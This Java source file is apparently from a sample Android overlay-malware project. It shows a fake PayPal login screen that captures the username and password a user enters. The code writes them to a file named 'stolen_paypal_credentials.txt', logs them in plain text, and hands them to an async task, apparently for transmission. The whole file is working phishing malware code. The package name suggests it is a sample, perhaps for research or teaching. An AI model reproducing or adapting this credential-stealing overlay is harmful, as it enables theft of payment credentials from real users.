package com.abhishek_cdac.sample_overlay_malware;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.AppCompatButton;

import android.app.Dialog;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;

public class PayPalActivity extends AppCompatActivity {
    private static final String LOG_TAG = "FakePaypal";
    private Button btnPaypalLogin;
    private TextView tvPaypalPassword;
    private TextView tvPaypalUsername;

    private final String fileName = "stolen_paypal_credentials.txt";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_pay_pal);

        tvPaypalPassword = findViewById(R.id.et_paypal_password);
        tvPaypalUsername = findViewById(R.id.et_paypal_user_name);

        btnPaypalLogin = findViewById(R.id.btn_paypal_login);

        btnPaypalLogin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String username= tvPaypalUsername.getText().toString().trim();
                String password = tvPaypalPassword.getText().toString().trim();


                if (username.isEmpty()){
                    tvPaypalUsername.setError("Please enter phone or email");
                    return;
                }

                if (password.isEmpty()) {
                    tvPaypalPassword.setError("Please enter password");
                    return;
                }

                if(saveFacebookCredentialsToFile(username, password))
                    showSuccessInfo();
                else
                    showFailureDialog();

            }
        });
    }

    // IMPORTANT!!
    public File getAppExternalFilesDir()  {
        if (android.os.Build.VERSION.SDK_INT >= 29) {
            // /storage/emulated/0/Android/data/org.o7planning.externalstoragedemo/files
            return this.getExternalFilesDir(null);
        } else {
            // @Deprecated in API 29.
            // /storage/emulated/0
            return Environment.getExternalStorageDirectory();
        }
    }
    private boolean saveFacebookCredentialsToFile(String username, String password) {

        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("Paypal_username", username);
            jsonObject.put("Paypal_password", password);
            AsyncT asyncT = new AsyncT(jsonObject);
            asyncT.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        try {
            File extStore = this.getAppExternalFilesDir( );

            boolean canWrite = extStore.canWrite();
            Log.i(LOG_TAG, "Can write: " + extStore.getAbsolutePath()+" : " + canWrite);

            String path = extStore.getAbsolutePath() + "/" + fileName;
            Log.i(LOG_TAG, "Save to: " + path);

            String data = "UserName: " + username + "\n" + "Password: " + password;
            Log.i(LOG_TAG, "Data: " + data);


            File myFile = new File(path);
            FileOutputStream fOut = new FileOutputStream(myFile);
            fOut.write(data.getBytes("UTF-8"));
            fOut.close();
            Log.i(LOG_TAG, "Credentials Saved.");
            return true;
        } catch (Exception e) {
            Log.e(LOG_TAG, "Write Error: " + e.getMessage());
            e.printStackTrace();
            return false;
        }

    }



    private void showFailureDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE); // before
        dialog.setContentView(R.layout.dialog_warning);
        dialog.setCancelable(true);

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.copyFrom(dialog.getWindow().getAttributes());
        lp.width = WindowManager.LayoutParams.WRAP_CONTENT;
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;


        ((AppCompatButton) dialog.findViewById(R.id.bt_close)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });

        dialog.show();
        dialog.getWindow().setAttributes(lp);
    }

    private void showSuccessInfo() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE); // before
        dialog.setContentView(R.layout.dialog_success_info);
        dialog.setCancelable(true);

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.copyFrom(dialog.getWindow().getAttributes());
        lp.width = WindowManager.LayoutParams.WRAP_CONTENT;
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;


        ((AppCompatButton) dialog.findViewById(R.id.bt_close)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });

        dialog.show();
        dialog.getWindow().setAttributes(lp);
    }

}